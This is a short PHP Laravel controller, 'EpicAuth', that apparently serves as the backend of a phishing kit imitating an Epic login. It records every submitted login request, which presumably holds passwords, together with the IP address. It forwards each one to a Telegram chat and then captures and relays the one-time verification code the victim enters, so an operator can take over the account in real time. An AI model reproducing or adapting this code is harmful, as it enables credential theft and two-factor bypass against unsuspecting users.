<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Action;
use App\Classes\TelegramApi;
class EpicAuth extends Controller
{
    public function login(Request $request){
        $telegram = new TelegramApi();

        $Action = new Action();
        $Action->type_action = "login";
        $Action->ip = $request->ip();
        $Action->data = json_encode($request->all());
        $telegram->sendMessage("Пользователь попытался " . $request->login . " авторизоваться \n " . json_encode($request->all()));
        $Action->save();

        return $Action;
    }
    public function checkStatus(Request $request){
        $action = Action::where("id", $request->id)->first();
        return $action->status;
    }
    public function code(Request $request){
        $telegram = new TelegramApi();

        $action = Action::where("id", $request->id)->first();
        $data = json_decode($action['data'], true);
        $telegram->sendMessage("Пользователь по действию с id " . $action['id'].  " ввел код " . $request->code . "\n" . $action['data']);
        $data['code'] = $request->code;
        $action->data = json_encode($data);
        $action->status = "code";
        $action->save();


    }
}
